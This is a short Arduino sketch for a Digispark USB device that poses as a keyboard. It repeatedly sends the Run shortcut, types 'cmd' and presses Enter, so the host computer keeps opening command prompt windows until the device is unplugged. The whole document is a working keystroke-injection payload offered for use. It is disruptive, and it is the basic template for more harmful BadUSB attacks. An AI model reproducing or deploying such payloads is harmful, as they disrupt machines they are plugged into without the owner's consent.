Sends commands to open CMD until unplugged.

(Runs repeatedly)

  #include "DigiKeyboard.h"
  void setup() {
    //empty
  }
  void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboard.print("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }